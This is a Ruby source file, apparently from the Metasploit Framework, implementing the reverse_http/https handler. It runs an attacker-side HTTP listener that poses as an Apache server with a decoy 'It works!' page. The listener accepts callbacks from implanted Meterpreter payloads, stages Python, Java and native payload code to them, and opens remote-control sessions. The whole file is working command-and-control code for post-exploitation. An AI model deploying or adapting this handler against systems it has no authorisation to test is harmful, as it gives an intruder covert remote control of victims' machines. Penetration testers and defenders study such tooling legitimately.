# -*- coding: binary -*-
require 'rex/io/stream_abstraction'
require 'rex/sync/ref'
require 'rex/payloads/meterpreter/uri_checksum'
require 'rex/post/meterpreter'
require 'rex/parser/x509_certificate'
require 'msf/core/payload/windows/verify_ssl'
require 'rex/user_agent'

module Msf
module Handler

###
#
# This handler implements the HTTP SSL tunneling interface.
#
###
module ReverseHttp

  include Msf::Handler
  include Msf::Handler::Reverse
  include Rex::Payloads::Meterpreter::UriChecksum
  include Msf::Payload::Windows::VerifySsl

  #
  # Returns the string representation of the handler type
  #
  def self.handler_type
    return 'reverse_http'
  end

  #
  # Returns the connection-described general handler type, in this case
  # 'tunnel'.
  #
  def self.general_handler_type
    "tunnel"
  end

  #
  # Initializes the HTTP SSL tunneling handler.
  #
  def initialize(info = {})
    super

    register_options(
      [
        OptString.new('LHOST', [true, 'The local listener hostname']),
        OptPort.new('LPORT', [true, 'The local listener port', 8080]),
        OptString.new('LURI', [false, 'The HTTP Path', ''])
      ], Msf::Handler::ReverseHttp)

    register_advanced_options(
      [

        OptString.new('MeterpreterUserAgent', [false, 'The user-agent that the payload should use for communication', Rex::UserAgent.shortest]),
        OptString.new('MeterpreterServerName', [false, 'The server header that the handler will send in response to requests', 'Apache']),
        OptAddress.new('ReverseListenerBindAddress', [false, 'The specific IP address to bind to on the local system']),
        OptBool.new('OverrideRequestHost', [false, 'Forces a specific host and port instead of using what the client requests, defaults to LHOST:LPORT', false]),
        OptString.new('OverrideLHOST', [false, 'When OverrideRequestHost is set, use this value as the host name for secondary requests']),
        OptPort.new('OverrideLPORT', [false, 'When OverrideRequestHost is set, use this value as the port number for secondary requests']),
        OptString.new('HttpUnknownRequestResponse', [false, 'The returned HTML response body when the handler receives a request that is not from a payload', '<html><body><h1>It works!</h1></body></html>']),
        OptBool.new('IgnoreUnknownPayloads', [false, 'Whether to drop connections from payloads using unknown UUIDs', false])
      ], Msf::Handler::ReverseHttp)
  end

  def print_prefix
    if Thread.current[:cli]
      luri = datastore['LURI'].empty? ? "" : "-> (#{datastore['LURI']}) "
      super + "#{listener_uri} handling request from #{Thread.current[:cli].peerhost}#{luri}; (UUID: #{uuid.to_s}) "
    else
      super
    end
  end

  # Return a URI suitable for placing in a payload
  #
  # @return [String] A URI of the form +scheme://host:port/+
  def listener_uri(addr=datastore['LHOST'])
    uri_host = Rex::Socket.is_ipv6?(addr) ? "[#{addr}]" : addr
    "#{scheme}://#{uri_host}:#{bind_port}#{luri}/"
  end

  # Return a URI suitable for placing in a payload.
  #
  # Host will be properly wrapped in square brackets, +[]+, for ipv6
  # addresses.
  #
  # @return [String] A URI of the form +scheme://host:port/+
  def payload_uri(req)
    callback_host = nil

    # Extract whatever the client sent us in the Host header
    if req && req.headers && req.headers['Host']
      callback_host = req.headers['Host']
    end

    # Override the host and port as appropriate
    if datastore['OverrideRequestHost'] || callback_host.nil?
      callback_name = datastore['OverrideLHOST'] || datastore['LHOST']
      callback_port = datastore['OverrideLPORT'] || datastore['LPORT']
      if Rex::Socket.is_ipv6? callback_name
        callback_name = "[#{callback_name}]"
      end
      callback_host = "#{callback_name}:#{callback_port}"
    end

    "#{scheme}://#{callback_host}"
  end

  # Use the #refname to determine whether this handler uses SSL or not
  #
  def ssl?
    !!(self.refname.index('https'))
  end

  # URI scheme
  #
  # @return [String] One of "http" or "https" depending on whether we
  #   are using SSL
  def scheme
    (ssl?) ? 'https' : 'http'
  end

  #
  # The local URI for the handler.
  #
  # @return [String] Representation of the URI to listen on.
  #
  def luri
    l = datastore['LURI'] || ""

    if l && l.length > 0 && l[0] != '/'
      # make sure the luri has the prefix
      l = "/#{l}"

      # but not the suffix
      if l[-1] == '/'
        l = l[0...-1]
      end
    end

    l.dup
  end

  # Create an HTTP listener
  #
  def setup_handler

    local_addr = nil
    local_port = bind_port
    ex = false

    # Start the HTTPS server service on this host/port
    bind_addresses.each do |ip|
      begin
        self.service = Rex::ServiceManager.start(Rex::Proto::Http::Server,
          local_port, ip, ssl?,
          {
            'Msf'        => framework,
            'MsfExploit' => self,
          },
          nil,
          (ssl?) ? datastore['HandlerSSLCert'] : nil
        )
        local_addr = ip
      rescue
        ex = $!
        print_error("Handler failed to bind to #{ip}:#{local_port}")
      else
        ex = false
        break
      end
    end

    raise ex if (ex)

    self.service.server_name = datastore['MeterpreterServerName']

    # Create a reference to ourselves
    obj = self

    # Add the new resource
    service.add_resource(luri + "/",
      'Proc' => Proc.new { |cli, req|
        on_request(cli, req, obj)
      },
      'VirtualDirectory' => true)

    print_status("Started #{scheme.upcase} reverse handler on #{listener_uri(local_addr)}")
    lookup_proxy_settings

    if datastore['IgnoreUnknownPayloads']
      print_status("Handler is ignoring unknown payloads, there are #{framework.uuid_db.keys.length} UUIDs whitelisted")
    end
  end

  #
  # Removes the / handler, possibly stopping the service if no sessions are
  # active on sub-urls.
  #
  def stop_handler
    if self.service
      self.service.remove_resource(luri + "/")
      if self.service.resources.empty? && self.sessions == 0
        Rex::ServiceManager.stop_service(self.service)
      end
    end
  end

  attr_accessor :service # :nodoc:

protected

  #
  # Parses the proxy settings and returns a hash
  #
  def lookup_proxy_settings
    info = {}
    return @proxy_settings if @proxy_settings

    if datastore['PayloadProxyHost'].to_s == ''
      @proxy_settings = info
      return @proxy_settings
    end

    info[:host] = datastore['PayloadProxyHost'].to_s
    info[:port] = (datastore['PayloadProxyPort'] || 8080).to_i
    info[:type] = datastore['PayloadProxyType'].to_s

    uri_host = info[:host]

    if Rex::Socket.is_ipv6?(uri_host)
      uri_host = "[#{info[:host]}]"
    end

    info[:info] = "#{uri_host}:#{info[:port]}"

    if info[:type] == "SOCKS"
      info[:info] = "socks=#{info[:info]}"
    else
      info[:info] = "http://#{info[:info]}"
      if datastore['PayloadProxyUser'].to_s != ''
        info[:username] = datastore['PayloadProxyUser'].to_s
      end
      if datastore['PayloadProxyPass'].to_s != ''
        info[:password] = datastore['PayloadProxyPass'].to_s
      end
    end

    @proxy_settings = info
  end

  #
  # Parses the HTTPS request
  #
  def on_request(cli, req, obj)
    Thread.current[:cli] = cli
    resp = Rex::Proto::Http::Response.new
    info = process_uri_resource(req.relative_resource)
    uuid = info[:uuid] || Msf::Payload::UUID.new

    # Configure the UUID architecture and payload if necessary
    uuid.arch      ||= obj.arch
    uuid.platform  ||= obj.platform

    conn_id = luri
    if info[:mode] && info[:mode] != :connect
      conn_id << generate_uri_uuid(URI_CHECKSUM_CONN, uuid)
    else
      conn_id << req.relative_resource
      conn_id = conn_id[0...-1] if conn_id[-1] == '/'
    end

    request_summary = "#{luri}#{req.relative_resource} with UA '#{req.headers['User-Agent']}'"

    # Validate known UUIDs for all requests if IgnoreUnknownPayloads is set
    if datastore['IgnoreUnknownPayloads'] && ! framework.uuid_db[uuid.puid_hex]
      print_status("Ignoring unknown UUID: #{request_summary}")
      info[:mode] = :unknown_uuid
    end

    # Validate known URLs for all session init requests if IgnoreUnknownPayloads is set
    if datastore['IgnoreUnknownPayloads'] && info[:mode].to_s =~ /^init_/
      allowed_urls = framework.uuid_db[uuid.puid_hex]['urls'] || []
      unless allowed_urls.include?(req.relative_resource)
        print_status("Ignoring unknown UUID URL: #{request_summary}")
        info[:mode] = :unknown_uuid_url
      end
    end

    self.pending_connections += 1

    # Process the requested resource.
    case info[:mode]
      when :init_connect
        print_status("Redirecting stageless connection from #{request_summary}")

        # Handle the case where stageless payloads call in on the same URI when they
        # first connect. From there, we tell them to callback on a connect URI that
        # was generated on the fly. This means we form a new session for each.

        # Hurl a TLV back at the caller, and ignore the response
        pkt = Rex::Post::Meterpreter::Packet.new(Rex::Post::Meterpreter::PACKET_TYPE_RESPONSE,
                                                 'core_patch_url')
        pkt.add_tlv(Rex::Post::Meterpreter::TLV_TYPE_TRANS_URL, conn_id + "/")
        resp.body = pkt.to_r

      when :init_python
        print_status("Staging Python payload...")
        url = payload_uri(req) + conn_id + '/'

        blob = ""
        blob << obj.generate_stage(
          http_url: url,
          http_user_agent: datastore['MeterpreterUserAgent'],
          http_proxy_host: datastore['PayloadProxyHost'] || datastore['PROXYHOST'],
          http_proxy_port: datastore['PayloadProxyPort'] || datastore['PROXYPORT'],
          uuid: uuid,
          uri:  conn_id
        )

        resp.body = blob

        # Short-circuit the payload's handle_connection processing for create_session
        create_session(cli, {
          :passive_dispatcher => obj.service,
          :conn_id            => conn_id,
          :url                => url,
          :expiration         => datastore['SessionExpirationTimeout'].to_i,
          :comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
          :retry_total        => datastore['SessionRetryTotal'].to_i,
          :retry_wait         => datastore['SessionRetryWait'].to_i,
          :ssl                => ssl?,
          :payload_uuid       => uuid
        })

      when :init_java
        print_status("Staging Java payload...")
        url = payload_uri(req) + conn_id + "/\x00"

        blob = obj.generate_stage(
          uuid: uuid,
          uri:  conn_id
        )

        resp.body = blob

        # Short-circuit the payload's handle_connection processing for create_session
        create_session(cli, {
          :passive_dispatcher => obj.service,
          :conn_id            => conn_id,
          :url                => url,
          :expiration         => datastore['SessionExpirationTimeout'].to_i,
          :comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
          :retry_total        => datastore['SessionRetryTotal'].to_i,
          :retry_wait         => datastore['SessionRetryWait'].to_i,
          :ssl                => ssl?,
          :payload_uuid       => uuid
        })

      when :init_native
        print_status("Staging Native payload...")
        url = payload_uri(req) + conn_id + "/\x00"
        uri = URI(payload_uri(req) + conn_id)

        resp['Content-Type'] = 'application/octet-stream'

        begin
          # generate the stage, but pass in the existing UUID and connection id so that
          # we don't get new ones generated.
          blob = obj.stage_payload(
            uuid: uuid,
            uri:  conn_id,
            lhost: uri.host,
            lport: uri.port
          )

          resp.body = encode_stage(blob)

          # Short-circuit the payload's handle_connection processing for create_session
          create_session(cli, {
            :passive_dispatcher => obj.service,
            :conn_id            => conn_id,
            :url                => url,
            :expiration         => datastore['SessionExpirationTimeout'].to_i,
            :comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
            :retry_total        => datastore['SessionRetryTotal'].to_i,
            :retry_wait         => datastore['SessionRetryWait'].to_i,
            :ssl                => ssl?,
            :payload_uuid       => uuid
          })
        rescue NoMethodError
          print_error("Staging failed. This can occur when stageless listeners are used with staged payloads.")
          return
        end

      when :connect
        print_status("Attaching orphaned/stageless session...")

        resp.body = ''

        url = payload_uri(req) + conn_id
        url << '/' unless url[-1] == '/'

        # Short-circuit the payload's handle_connection processing for create_session
        create_session(cli, {
          :passive_dispatcher => obj.service,
          :conn_id            => conn_id,
          :url                => url + "\x00",
          :expiration         => datastore['SessionExpirationTimeout'].to_i,
          :comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
          :retry_total        => datastore['SessionRetryTotal'].to_i,
          :retry_wait         => datastore['SessionRetryWait'].to_i,
          :ssl                => ssl?,
          :payload_uuid       => uuid
        })

      else
        unless [:unknown_uuid, :unknown_uuid_url].include?(info[:mode])
          print_status("Unknown request to #{request_summary}")
        end
        resp = nil
        self.pending_connections -= 1
    end

    cli.send_response(resp) if (resp)

    # Force this socket to be closed
    obj.service.close_client(cli)
  end

end

end
end

